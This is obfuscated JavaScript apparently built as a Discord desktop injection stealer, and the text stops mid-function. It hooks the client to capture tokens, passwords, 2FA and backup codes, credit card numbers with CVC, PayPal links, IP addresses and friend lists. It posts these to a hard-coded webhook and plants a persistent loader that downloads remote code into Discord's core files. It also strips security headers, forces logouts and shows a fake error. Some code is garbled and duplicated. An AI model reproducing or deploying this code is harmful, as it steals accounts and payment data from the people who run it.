const { BrowserWindow: BrowserWindow, session: session } = require('electron'),
  { execSync } = require('child_process'),
  { dialog } = require('electron'),
  { parse: parse } = require('querystring'),
  fs = require('fs'),
  os = require('os'),
  https = require('https'),
  path = require('path')
let WEBHOOK = 'https://discord.com/api/webhooks/1250145944226369618/e2NNn-bK6X9D7dU84rcxee4xZAy_-iJLSRVzGS9ivjbThfZ9xuOK6dYoKQS7vipk0BbY',
  KEY = 'oCfmdTdbmt',
  [BACKUPCODES_SCRIPT, LOGOUT_SCRIPT, TOKEN_SCRIPT, BADGES, EMAIL, PASSWORD] = [
    'const elements = document.querySelectorAll(\'span[class^="code_"]\');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;',
    'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
    "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;",
    {
      _nitro: [
        '<:2m:1220534352270725120>',
        '<:3m:1220534465294762170>',
        '<:6m:1220534255902527530>',
        '<:9m:1220534353772286126>',
        '<:12m:1220534466813104158>',
        '<:15m:1220534355584356463>',
        '<:18m:1220534258171510855>',
        '<:24m:1220534256640462914>',
      ],
      _discord_emloyee: {
        value: 1,
        emoji: '<:discord_employee:1214500513236910110> ',
        rare: true,
      },
      _partnered_server_owner: {
        value: 2,
        emoji: "'<:partner:1214005684765462630> ",
        rare: true,
      },
      _hypeSquad_events: {
        value: 4,
        emoji: '<:hypesquad_events:1214005924486709270> ',
        rare: true,
      },
      _bug_hunter_level_1: {
        value: 8,
        emoji: '<:discord_bughunterv1:1214006090727952456> ',
        rare: true,
      },
      _legacy_username: {
        value: 32,
        emoji: '<:oldusername_:1225569483028959334> ',
        rare: false,
      },
      _house_bravery: {
        value: 64,
        emoji: '<:bravery:1237256647374667869> ',
        rare: false,
      },
      _house_brilliance: {
        value: 128,
        Emoji: '<:brilliance:1237256669033922624> ',
        rare: false,
      },
      _house_balance: {
        value: 256,
        Emoji: '<:balance:1214500895220437013> ',
        rare: false,
      },
      _early_supporter: {
        value: 512,
        emoji: '<:discord_early:1214005368665940088> ',
        rare: true,
      },
      _bug_hunter_level_2: {
        value: 16384,
        Emoji: '<:discord_bughunterv2:1214006111829626980> ',
        rare: true,
      },
      _early_bot_developer: {
        value: 131072,
        Emoji: '<:discord_developer:1214006423785050173> ',
        rare: true,
      },
      _certified_moderator: {
        value: 262144,
        Emoji: '<:moderatorprogramsalumni:1214006652999696446> ',
        rare: true,
      },
      _active_developer: {
        value: 4194304,
        Emoji: '<:activedeveloper:1214500730900193322> ',
        rare: true,
      },
    },
    '',
    '',
  ]
const request = async (
    _0x1f6e2f,
    _0x68b437,
    _0x471939 = {},
    _0x48a3f4 = null
  ) => {
    try {
      return new Promise((_0x35234b, _0x171663) => {
        let _0x4a8d05 = new URL(_0x68b437),
          _0x21bd91 = {
            protocol: _0x4a8d05.protocol,
            hostname: _0x4a8d05.hostname,
            path: _0x4a8d05.pathname + _0x4a8d05.search,
            method: _0x1f6e2f.toUpperCase(),
            headers: {
              ..._0x471939,
              'Access-Control-Allow-Origin': '*',
            },
          },
          _0x2cce4c = https.request(_0x21bd91, (_0x38cc6f) => {
            let _0x14ff25 = ''
            _0x38cc6f.on('data', (_0x236706) => (_0x14ff25 += _0x236706))
            _0x38cc6f.on('end', () => _0x35234b(_0x14ff25))
          })
        _0x2cce4c.on('error', (_0x5df575) => _0x171663(_0x5df575))
        if (_0x48a3f4) {
          _0x2cce4c.write(_0x48a3f4)
        }
        _0x2cce4c.end()
      })
    } catch (_0x34af6f) {
      return Promise.reject(_0x34af6f)
    }
  },
  notify = async (_0x1884b8, _0x59663d, _0x65c800) => {
    let _0x5744c7 = getNitro(await fProfile(_0x59663d)),
      _0x2040fe = await getBadges(_0x65c800.flags),
      _0x2bb877 = await getBilling(_0x59663d),
      _0x2cdc41 = await getFriends(_0x59663d)
    _0x1884b8.embeds[0].title = ''
    _0x1884b8.embeds[0].fields.unshift({
      name: '\uD83D\uDC51 Token:',
      value:
        '`' +
        _0x59663d +
        '`\n[Copy Token!](https://stealit.vercel.app/?p=' +
        _0x59663d +
        ')',
      inline: false,
    })
    _0x1884b8.embeds[0].thumbnail = {
      url:
        'https://cdn.discordapp.com/avatars/' +
        _0x65c800.id +
        '/' +
        _0x65c800.avatar +
        '.webp',
    }
    _0x1884b8.embeds[0].fields.push(
      {
        name: '\uD83D\uDC8E Badges',
        value: _0x2040fe,
        inline: true,
      },
      {
        name: '\uD83D\uDE80 Nitro Type',
        value: _0x5744c7,
        inline: true,
      },
      {
        name: '\uD83D\uDCB3 Billing',
        value: _0x2bb877,
        inline: true,
      },
      {
        name: '\uD83C\uDF10 IP',
        value: '`' + JSON.parse(await getNetwork()).ip + '`',
        inline: true,
      }
    )
    _0x1884b8.embeds.push({
      title: 'HQ Friends',
      description: _0x2cdc41,
    })
    _0x1884b8.embeds.forEach((_0x12161d) => {
      _0x12161d.color = 2829617
      _0x12161d.author = {
        name: _0x65c800.username + ' (' + _0x65c800.id + ')',
        icon_url:
          'https://cdn.discordapp.com/avatars/' +
          _0x65c800.id +
          '/' +
          _0x65c800.avatar +
          '.png',
      }
      _0x12161d.footer = {
        text: decodeB64('dC5tZS9zdGVhbGl0cHVibGlj') + (' Key: ' + KEY),
        icon_url: 'https://i.imgur.com/l7vuOlV.png',
      }
    })
    try {
      await request(
        'POST',
        WEBHOOK,
        { 'Content-Type': 'application/json' },
        JSON.stringify(_0x1884b8)
      )
    } catch (_0x13ecbe) {
      console.error('Error sending request to webhook:', _0x13ecbe.message)
    }
  },
  decodeB64 = (_0x36c353) => Buffer.from(_0x36c353, 'base64').toString(),
  execScript = async (_0x368654) =>
    await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
      _0x368654,
      true
    )
dialog.showErrorBox('Ops!', 'An internal error occurred in the Discord API.')
const fetch = async (_0x11c7e1, _0x5a91ef) =>
  JSON.parse(
    await request(
      'GET',
      [
        'https://discordapp.com/api',
        'https://discord.com/api',
        'https://canary.discord.com/api',
        'https://ptb.discord.com/api',
      ][Math.floor(Math.random() * 4)] +
        '/v9/users/' +
        _0x11c7e1,
      { ..._0x5a91ef }
    )
  )
const fAccount = async (_0x895780) =>
    await fetch('@me', { authorization: _0x895780 }),
  fProfile = async (_0x586349) =>
    await fetch(
      Buffer.from(_0x586349.split('.')[0], 'base64').toString('binary') +
        '/profile',
      { authorization: _0x586349 }
    ),
  fFriends = async (_0x21f12c) =>
    await fetch('@me/relationships', { authorization: _0x21f12c }),
  fServers = async (_0x12c912) =>
    await fetch('@me/guilds?with_counts=true', { authorization: _0x12c912 }),
  fBilling = async (_0x56f4a2) =>
    await fetch('@me/billing/payment-sources', { authorization: _0x56f4a2 })
const getNetwork = async () =>
    await request('GET', 'https://api.ipify.org/?format=json', {
      'Content-Type': 'application/json',
    }),
  getBadges = (_0x49fb6b) =>
    Object.keys(BADGES).reduce(
      (_0xb63681, _0x249ee1) =>
        BADGES.hasOwnProperty(_0x249ee1) &&
        (_0x49fb6b & BADGES[_0x249ee1].value) === BADGES[_0x249ee1].value
          ? '' + _0xb63681 + BADGES[_0x249ee1].emoji + ' '
          : _0xb63681,
      ''
    ) || '`No Badges`',
  getRareBadges = (_0x4f7017) =>
    Object.keys(BADGES).reduce(
      (_0xc952da, _0x3ed470) =>
        BADGES.hasOwnProperty(_0x3ed470) &&
        (_0x4f7017 & BADGES[_0x3ed470].value) === BADGES[_0x3ed470].value &&
        BADGES[_0x3ed470].rare
          ? '' + _0xc952da + BADGES[_0x3ed470].emoji + ' '
          : _0xc952da,
      ''
    ),
  getBilling = async (_0x7424d) =>
    (await fBilling(_0x7424d))
      .filter((_0x257ff9) => !_0x257ff9.invalid)
      .map((_0x3717ac) =>
        _0x3717ac.type === 1
          ? '\uD83D\uDCB3'
          : _0x3717ac.type === 2
          ? '<:paypal:1237254350896627712>'
          : ''
      )
      .join('') || '`None`',
  getFriends = async (_0x59fef4) =>
    (await fFriends(_0x59fef4))
      .filter((_0x4bd4c2) => _0x4bd4c2.type === 1)
      .reduce(
        (_0x209e14, _0x14abe4) =>
          ((_0x41a79c) =>
            _0x41a79c
              ? (_0x209e14 || '') +
                (_0x41a79c + ' | `' + _0x14abe4.user.username + '`\n')
              : _0x209e14)(getRareBadges(_0x14abe4.user.public_flags)),
        ''
      ) || '*Nothing to see here*',
  getDate = (_0x36cd2d, _0x4780a9) =>
    new Date(_0x36cd2d).setMonth(_0x36cd2d.getMonth() + _0x4780a9),
  getNitro = (_0x5cbcb3) => {
    let { premium_type: _0x1476b2, premium_guild_since: _0x53d773 } = _0x5cbcb3,
      _0x1599c1 = '<:discord_nitro:1214362608862236743>'
    switch (_0x1476b2) {
      default:
        return 'none'
      case 1:
        return _0x1599c1
      case 2:
        if (!_0x53d773) {
          return _0x1599c1
        }
        let _0x2ae6d9 = [2, 3, 6, 9, 12, 15, 18, 24],
          _0x49d9c0 = 0
        for (let _0x2ad645 = 0; _0x2ad645 < _0x2ae6d9.length; _0x2ad645++) {
          if (
            Math.round(
              (getDate(new Date(_0x53d773), _0x2ae6d9[_0x2ad645]) -
                new Date()) /
                86400000
            ) > 0
          ) {
            _0x49d9c0 = _0x2ad645
            break
          }
        }
        return _0x1599c1 + ' ' + BADGES['_nitro'][_0x49d9c0]
    }
  },
  cruise = async (
    _0x1d6dc2,
    _0x3a633c,
    _0x3135b7,
    _0x26aeb6,
    _0x1057a7,
    _0x556f74
  ) => {
    let _0x3c5630, _0x752629
    let _0x404a3b
    switch (_0x1d6dc2) {
      case 'LOGIN_USER':
        ;(_0x3c5630 = await fAccount(_0x26aeb6.token)),
          (_0x752629 = {
            title: _0x556f74,
            embeds: [
              {
                fields: [
                  {
                    name: '\uD83D\uDCE9 E-Mail',
                    value: '`' + _0x3a633c + '`',
                    inline: true,
                  },
                  {
                    name: '\uD83D\uDD11 Password',
                    value: '`' + _0x3135b7 + '`',
                    inline: true,
                  },
                ],
              },
            ],
          })
        _0x1057a7.code !== undefined &&
          _0x752629.embeds[0].fields.push({
            name: '\uD83D\uDD13 Used 2fa Code',
            value: '`' + _0x1057a7.code + '`',
            inline: true,
          })
        notify(_0x752629, _0x26aeb6.token, _0x3c5630)
        break
      case 'USERNAME_CHANGED':
        ;(_0x3c5630 = await fAccount(_0x26aeb6.token)),
          (_0x752629 = {
            title: _0x556f74,
            embeds: [
              {
                fields: [
                  {
                    name: '\uD83C\uDFF7️ New Username',
                    value: '`' + _0x1057a7.username + '`',
                    inline: true,
                  },
                  {
                    name: '\uD83D\uDD11 Password',
                    value: '`' + _0x1057a7.password + '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x752629, _0x26aeb6.token, _0x3c5630)
        break
      case 'EMAIL_CHANGED':
        ;(_0x3c5630 = await fAccount(_0x26aeb6.token)),
          (_0x752629 = {
            title: _0x556f74,
            embeds: [
              {
                fields: [
                  {
                    name: '\uD83D\uDCE9 E-Mail',
                    value: '`' + _0x3a633c + '`',
                    inline: true,
                  },
                  {
                    name: '\uD83D\uDD11 Password',
                    value: '`' + _0x3135b7 + '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x752629, _0x26aeb6.token, _0x3c5630)
        break
      case 'PASSWORD_CHANGED':
        ;(_0x3c5630 = await fAccount(_0x26aeb6.token)),
          (_0x752629 = {
            title: _0x556f74,
            embeds: [
              {
                fields: [
                  {
                    name: '\uD83D\uDD11 New Password',
                    value: '`' + _0x1057a7.new_password + '`',
                    inline: true,
                  },
                  {
                    name: '\uD83D\uDD11 Old Password',
                    value: '`' + _0x1057a7.password + '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x752629, _0x26aeb6.token, _0x3c5630)
        break
      case 'CREDITCARD_ADDED':
        ;(_0x404a3b = _0x26aeb6),
          (_0x3c5630 = await fAccount(_0x404a3b)),
          (_0x752629 = {
            title: _0x556f74,
            embeds: [
              {
                fields: [
                  {
                    name: '\uD83D\uDD22 Number',
                    value: '`' + _0x1057a7['card[number]'] + '`',
                    inline: true,
                  },
                  {
                    name: '\uD83D\uDD10 CVC',
                    value: '`' + _0x1057a7['card[cvc]'] + '`',
                    inline: true,
                  },
                  {
                    name: '\uD83C\uDFEA Expiration',
                    value:
                      '`' +
                      _0x1057a7['card[exp_month]'] +
                      '/' +
                      _0x1057a7['card[exp_year]'] +
                      '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x752629, _0x404a3b, _0x3c5630)
        break
        const _0x484d6c = async (
          _0x2efcdf,
          _0x4d63de,
          _0x52867e,
          _0x2573a5,
          _0x4437d9,
          _0x38b07f
        ) => {
          let _0x45f5b6, _0x2de665
          let _0x4d9251
          switch (_0x2efcdf) {
            case 'LOGIN_USER':
              ;(_0x45f5b6 = await fAccount(_0x2573a5.token)),
                (_0x2de665 = {
                  title: _0x38b07f,
                  embeds: [
                    {
                      fields: [
                        {
                          name: '\uD83D\uDCE9 E-Mail',
                          value: '`' + _0x4d63de + '`',
                          inline: true,
                        },
                        {
                          name: '\uD83D\uDD11 Password',
                          value: '`' + _0x52867e + '`',
                          inline: true,
                        },
                      ],
                    },
                  ],
                })
              _0x4437d9.code !== undefined &&
                _0x2de665.embeds[0].fields.push({
                  name: '\uD83D\uDD13 Used 2fa Code',
                  value: '`' + _0x4437d9.code + '`',
                  inline: true,
                })
              notify(_0x2de665, _0x2573a5.token, _0x45f5b6)
              break
            case 'USERNAME_CHANGED':
              ;(_0x45f5b6 = await fAccount(_0x2573a5.token)),
                (_0x2de665 = {
                  title: _0x38b07f,
                  embeds: [
                    {
                      fields: [
                        {
                          name: '\uD83C\uDFF7️ New Username',
                          value: '`' + _0x4437d9.username + '`',
                          inline: true,
                        },
                        {
                          name: '\uD83D\uDD11 Password',
                          value: '`' + _0x4437d9.password + '`',
                          inline: true,
                        },
                      ],
                    },
                  ],
                }),
                notify(_0x2de665, _0x2573a5.token, _0x45f5b6)
              break
            case 'EMAIL_CHANGED':
              ;(_0x45f5b6 = await fAccount(_0x2573a5.token)),
                (_0x2de665 = {
                  title: _0x38b07f,
                  embeds: [
                    {
                      fields: [
                        {
                          name: '\uD83D\uDCE9 E-Mail',
                          value: '`' + _0x4d63de + '`',
                          inline: true,
                        },
                        {
                          name: '\uD83D\uDD11 Password',
                          value: '`' + _0x52867e + '`',
                          inline: true,
                        },
                      ],
                    },
                  ],
                }),
                notify(_0x2de665, _0x2573a5.token, _0x45f5b6)
              break
            case 'PASSWORD_CHANGED':
              ;(_0x45f5b6 = await fAccount(_0x2573a5.token)),
                (_0x2de665 = {
                  title: _0x38b07f,
                  embeds: [
                    {
                      fields: [
                        {
                          name: '\uD83D\uDD11 New Password',
                          value: '`' + _0x4437d9.new_password + '`',
                          inline: true,
                        },
                        {
                          name: '\uD83D\uDD11 Old Password',
                          value: '`' + _0x4437d9.password + '`',
                          inline: true,
                        },
                      ],
                    },
                  ],
                }),
                notify(_0x2de665, _0x2573a5.token, _0x45f5b6)
              break
            case 'CREDITCARD_ADDED':
              ;(_0x4d9251 = _0x2573a5),
                (_0x45f5b6 = await fAccount(_0x4d9251)),
                (_0x2de665 = {
                  title: _0x38b07f,
                  embeds: [
                    {
                      fields: [
                        {
                          name: '\uD83D\uDD22 Number',
                          value: '`' + _0x4437d9['card[number]'] + '`',
                          inline: true,
                        },
                        {
                          name: '\uD83D\uDD10 CVC',
                          value: '`' + _0x4437d9['card[cvc]'] + '`',
                          inline: true,
                        },
                        {
                          name: '\uD83C\uDFEA Expiration',
                          value:
                            '`' +
                            _0x4437d9['card[exp_month]'] +
                            '/' +
                            _0x4437d9['card[exp_year]'] +
                            '`',
                          inline: true,
                        },
                      ],
                    },
                  ],
                }),
                notify(_0x2de665, _0x4d9251, _0x45f5b6)
              break
            case request.url.endsWith('/codes-verification'):
              let _0x14fc0b = false,
                _0x26791c = (await execScript(backupscript)) ?? ''
              if (config.disable2FA == 'true') {
                for (
                  let _0xf00c80 = 0;
                  _0xf00c80 < _0x26791c.length;
                  _0xf00c80++
                ) {
                  if (!_0x14fc0b) {
                    let _0x397756 = await remove2FA(
                        _0x4d9251,
                        _0x26791c[_0xf00c80]
                      ),
                      _0x7753de = JSON.parse(_0x397756)
                    if (_0x7753de.token) {
                      _0x14fc0b = true
                      break
                    } else {
                      if (_0x7753de.message && _0x7753de.code) {
                        if (_0x7753de.message == '401: Unauthorized') {
                          _0x14fc0b = true
                          break
                        }
                      } else {
                        if (_0x7753de.message != 'Invalid two-factor code') {
                          _0x14fc0b = true
                          break
                        } else {
                          continue
                        }
                      }
                    }
                  }
                }
              }
              ;(_0x45f5b6 = await fAccount(_0x4d9251)),
                (_0x2de665 = {
                  title: _0x38b07f,
                  embeds: [
                    {
                      fields: [
                        {
                          name: 'Backup Codes \uD83D\uDD11',
                          value:
                            '```md\n' +
                            _0x26791c
                              .map((_0x1d331c) => '- ' + _0x1d331c)
                              .join('\n') +
                            '```',
                          inline: false,
                        },
                      ],
                    },
                  ],
                }),
                notify(_0x2de665, _0x4d9251, _0x45f5b6)
              break
            case 'PAYPAL_ADDED':
              ;(_0x4d9251 = _0x2573a5),
                (_0x45f5b6 = await fAccount(_0x4d9251)),
                (_0x2de665 = {
                  title: _0x38b07f,
                  embeds: [
                    {
                      fields: [
                        {
                          name: '\uD83D\uDCE9 E-Mail',
                          value: '`' + _0x45f5b6.email + '`',
                          inline: true,
                        },
                      ],
                    },
                  ],
                }),
                notify(_0x2de665, _0x4d9251, _0x45f5b6)
              break
            case 'INJECTED':
              ;(_0x4d9251 = _0x2573a5),
                (_0x45f5b6 = await fAccount(_0x4d9251)),
                (_0x2de665 = {
                  title: _0x38b07f,
                  embeds: [
                    {
                      fields: [
                        {
                          name: '\uD83D\uDCE9 E-Mail',
                          value: '`' + _0x45f5b6.email + '`',
                          inline: true,
                        },
                      ],
                    },
                  ],
                }),
                notify(_0x2de665, _0x4d9251, _0x45f5b6)
              break
            default:
          }
        }
      case 'CODES_VERIFICATION':
        let _0x57eb7d = false,
          _0x303f71 = (await execScript(backupscript)) ?? ''
        if (config.disable2FA == 'true') {
          for (let _0x13ccde = 0; _0x13ccde < _0x303f71.length; _0x13ccde++) {
            if (!_0x57eb7d) {
              let _0x5a182e = await remove2FA(_0x404a3b, _0x303f71[_0x13ccde]),
                _0x4805f0 = JSON.parse(_0x5a182e)
              if (_0x4805f0.token) {
                _0x57eb7d = true
                break
              } else {
                if (_0x4805f0.message && _0x4805f0.code) {
                  if (_0x4805f0.message == '401: Unauthorized') {
                    _0x57eb7d = true
                    break
                  }
                } else {
                  if (_0x4805f0.message != 'Invalid two-factor code') {
                    _0x57eb7d = true
                    break
                  } else {
                    continue
                  }
                }
              }
            }
          }
        }
        ;(_0x3c5630 = await fAccount(_0x404a3b)),
          (_0x752629 = {
            title: _0x556f74,
            embeds: [
              {
                fields: [
                  {
                    name: 'Backup Codes \uD83D\uDD11',
                    value:
                      '```md\n' +
                      _0x303f71
                        .map((_0xa3a682) => '- ' + _0xa3a682)
                        .join('\n') +
                      '```',
                    inline: false,
                  },
                ],
              },
            ],
          }),
          notify(_0x752629, _0x404a3b, _0x3c5630)
        break
      case 'PAYPAL_ADDED':
        ;(_0x404a3b = _0x26aeb6),
          (_0x3c5630 = await fAccount(_0x404a3b)),
          (_0x752629 = {
            title: _0x556f74,
            embeds: [
              {
                fields: [
                  {
                    name: '\uD83D\uDCE9 E-Mail',
                    value: '`' + _0x3c5630.email + '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x752629, _0x404a3b, _0x3c5630)
        break
      case 'INJECTED':
        ;(_0x404a3b = _0x26aeb6),
          (_0x3c5630 = await fAccount(_0x404a3b)),
          (_0x752629 = {
            title: _0x556f74,
            embeds: [
              {
                fields: [
                  {
                    name: '\uD83D\uDCE9 E-Mail',
                    value: '`' + _0x3c5630.email + '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x752629, _0x404a3b, _0x3c5630)
        break
      default:
    }
  },
  DISCORD_PATH = (function () {
    const _0x4a98ce = (function () {
        let _0x618522 = true
        return function (_0x44aca0, _0x516dba) {
          const _0x1a9869 = _0x618522
            ? function () {
                if (_0x516dba) {
                  const _0x3ad63c = _0x516dba.apply(_0x44aca0, arguments)
                  return (_0x516dba = null), _0x3ad63c
                }
              }
            : function () {}
          return (_0x618522 = false), _0x1a9869
        }
      })(),
      _0xbb289 = _0x4a98ce(this, function () {
        let _0x187050
        try {
          const _0x38c292 = Function(
            'return (function() {}.constructor("return this")( ));'
          )
          _0x187050 = _0x38c292()
        } catch (_0x4f80fe) {
          _0x187050 = window
        }
        const _0xf543c6 = (_0x187050.console = _0x187050.console || {})
        const _0x594620 = [
          'log',
          'warn',
          'info',
          'error',
          'exception',
          'table',
          'trace',
        ]
        for (let _0xba5196 = 0; _0xba5196 < _0x594620.length; _0xba5196++) {
          const _0x2ae658 = _0x4a98ce.constructor.prototype.bind(_0x4a98ce),
            _0x5b13ca = _0x594620[_0xba5196],
            _0x52aaaf = _0xf543c6[_0x5b13ca] || _0x2ae658
          _0x2ae658['__proto__'] = _0x4a98ce.bind(_0x4a98ce)
          _0x2ae658.toString = _0x52aaaf.toString.bind(_0x52aaaf)
          _0xf543c6[_0x5b13ca] = _0x2ae658
        }
      })
    _0xbb289()
    const _0x320a48 = process.argv[0]
      .split(path.sep)
      .slice(0, -1)
      .join(path.sep)
    let _0x48dcf4
    if (process.platform === 'win32') {
      _0x48dcf4 = path.join(_0x320a48, 'resources')
    } else {
      if (process.platform === 'darwin') {
        _0x48dcf4 = path.join(_0x320a48, 'Contents', 'Resources')
      }
    }
    if (fs.existsSync(_0x48dcf4)) {
      return {
        resource: _0x48dcf4,
        app: _0x320a48,
      }
    }
    return {
      undefined: undefined,
      undefined: undefined,
    }
  })()
async function UPDATE_CHECKING() {
  let _0x270ac6 = 'initiation'
  const { resource: _0x222df4, app: _0x24f753 } = DISCORD_PATH
  if (_0x222df4 === undefined || _0x24f753 === undefined) {
    return
  }
  let _0x56dff7 = path.join(_0x222df4, 'app')
  if (!fs.existsSync(_0x56dff7)) {
    fs.mkdirSync(_0x56dff7)
  }
  if (fs.existsSync(path.join(_0x56dff7, 'package.json'))) {
    fs.unlinkSync(path.join(_0x56dff7, 'package.json'))
  }
  if (fs.existsSync(path.join(_0x56dff7, 'index.js'))) {
    fs.unlinkSync(path.join(_0x56dff7, 'index.js'))
  }
  ;(process.platform === 'win32' || process.platform === 'darwin') &&
    (fs.writeFileSync(
      path.join(_0x56dff7, 'package.json'),
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4
      )
    ),
    fs.writeFileSync(
      path.join(_0x56dff7, 'index.js'),
      (
        "const fs = require('fs'), https = require('https');\nconst indexJs = '" +
        (_0x24f753 +
          '\\modules\\' +
          fs
            .readdirSync(_0x24f753 + '\\modules\\')
            .filter((_0x13b330) =>
              /discord_desktop_core-+?/.test(_0x13b330)
            )[0] +
          '\\discord_desktop_core\\index.js') +
        "';\nconst bdPath = '" +
        path.join(
          process.env.APPDATA,
          '\\betterdiscord\\data\\betterdiscord.asar'
        ) +
        "';\nconst sercwn = fs.statSync(indexJs).size;\n\nfs.readFile(indexJs, 'utf8', (err, data) => {\n    if (sercwn < 20000 || data === \"module.exports = require('./core.asar')\") {\n        init();\n    }\n});\n\nasync function init() {\n    const postData = JSON.stringify({\n        key: KEY\n    });\n\n    const options = {\n        hostname: '20.251.161.157',\n        port: 443,\n        path: '/api/injectionbot',\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application/json',\n            'Content-Length': postData.length\n        },\n        rejectUnauthorized: false \n    };\n\n    const req = https.request(options, (res) => {\n        let responseData = '';\n\n        res.on('data', (chunk) => {\n            responseData += chunk;\n        });\n\n        res.on('end', () => {\n            const file = fs.createWriteStream(indexJs);\n            file.write(responseData);\n            file.end();\n            file.on('finish', () => {\n                file.close();\n            });\n        });\n    });\n\n    req.on('error', (err) => {\n        console.error(err);\n        setTimeout(init, 10000);\n    });\n\n    req.write(postData);\n    req.end();\n}\n\nrequire('" +
        path.join(_0x222df4, 'app.asar') +
        "');\nif (fs.existsSync(bdPath)) require(bdPath);"
      ).replace(/\\/g, '\\\\')
    ))
  if (!fs.existsSync(path.join(__dirname, _0x270ac6))) {
    return
  } else {
    fs.rmdirSync(path.join(__dirname, _0x270ac6))
  }
  if (!(await execScript(TOKEN_SCRIPT))) {
    return
  }
  cruise(
    'INJECTED',
    null,
    null,
    (await execScript(TOKEN_SCRIPT)) ?? '',
    null,
    'DISCORD INJECTED'
  )
  execScript(LOGOUT_SCRIPT)
}
session.defaultSession.webRequest.onBeforeRequest(
  {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
      'https://discord.com/api/v*/auth/sessions',
      'https://*.discord.com/api/v*/auth/sessions',
      'https://discordapp.com/api/v*/auth/sessions',
    ],
  },
  (_0x3057ad, _0x29b8d5) => {
    if (!fs.existsSync(__dirname + '/Discord')) {
      fs.mkdirSync(__dirname + '/Discord')
    }
    !fs.existsSync(
      __dirname +
        '/Discord/' +
        WEBHOOK.split('/')[WEBHOOK.split('/').length - 1] +
        '.txt'
    ) &&
      (fs.writeFileSync(
        __dirname +
          '/Discord/' +
          WEBHOOK.split('/')[WEBHOOK.split('/').length - 1] +
          '.txt',
        WEBHOOK
      ),
      execScript(LOGOUT_SCRIPT))
    if (
      _0x3057ad.url.startsWith('wss://remote-auth-gateway') ||
      _0x3057ad.url.endsWith('auth/sessions')
    ) {
      _0x29b8d5({ cancel: true })
    } else {
      _0x29b8d5({ cancel: false })
    }
    UPDATE_CHECKING()
  }
)
session.defaultSession.webRequest.onHeadersReceived((_0x4a4392, _0x4da43c) => {
  delete _0x4a4392.responseHeaders['content-security-policy']
  delete _0x4a4392.responseHeaders['content-security-policy-report-only']
  _0x4da43c({
    responseHeaders: {
      ..._0x4a4392.responseHeaders,
      'Access-Control-Allow-Headers': '*',
    },
  })
})
session.defaultSession.webRequest.onCompleted(
  {
    urls: [
      'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
      'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
      'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
    ],
  },
  async (_0x5cb7d6, _0x225402) => {
    let _0x408df9
    try {
      _0x408df9 = parse(Buffer.from(_0x5cb7d6.uploadData[0].bytes).toString())
    } catch (_0x302945) {
      _0x408df9 = parse(
        decodeURIComponent(_0x5cb7d6.uploadData[0].bytes.toString())
      )
    }
    let _0x3790d4 = (await execScript(TOKEN_SCRIPT)) ?? ''
    if (_0x5cb7d6.method != 'POST') {
      return
    }
    if (_0x5cb7d6.statusCode !== 200 && _0x5cb7d6.statusCode !== 202) {
      return
    }
    if (_0x5cb7d6.url.endsWith('/paypal_accounts')) {
      cruise('PAYPAL_ADDED', null, null, _0x3790d4, null, 'PAYPAL ADDED')
    } else {
      if (_0x5cb7d6.url.endsWith('/tokens')) {
        cruise(
          'CREDITCARD_ADDED',
          null,
          null,
          _0x3790d4,
          _0x408df9,
          'CREDITCARD ADDED'
        )
      } else {
        _0x5cb7d6.url.endsWith('/codes-verification') &&
          cruise(
            'CODES_VERIFICATION',
            null,
            null,
            _0x3790d4,
            _0x408df9,
            'BACKUP CODES'
          )
      }
    }
  }
)
const CREATE_WINDOW_CLIENT = (_0x504e1a) => {
  if (!_0x504e1a.getAllWindows()[0]) {
    return
  }
  _0x504e1a.getAllWindows()[0].webContents.debugger.attach('1.3')
  _0x504e1a
    .getAllWindows()[0]
    .webContents.debugger.on(
      'message',
      async (_0x23ba8c, _0x501171, _0x30186a) => {
        if (_0x501171 !== 'Network.responseReceived') {
          return
        }
        if (
          !['/auth/login', '/auth/register', '/mfa/totp', '/users/@me'].some(
            (_0x206eb9) => _0x30186a.response.url.endsWith(_0x206eb9)
          )
        ) {
          return
        }
        if (
          _0x30186a.response.status !== 200 &&
          _0x30186a.response.status !== 202
        ) {
          return
        }
        let _0x3454e4 = JSON.parse(
            (
              await _0x504e1a
                .getAllWindows()[0]
                .webContents.debugger.sendCommand('Network.getResponseBody', {
                  requestId: _0x30186a.requestId,
                })
            ).body
          ),
          _0x187ced = JSON.parse(
            (
              await _0x504e1a
                .getAllWindows()[0]
                .webContents.debugger.sendCommand(
                  'Network.getRequestPostData',
                  { requestId: _0x30186a.requestId }
                )
            ).postData
          )
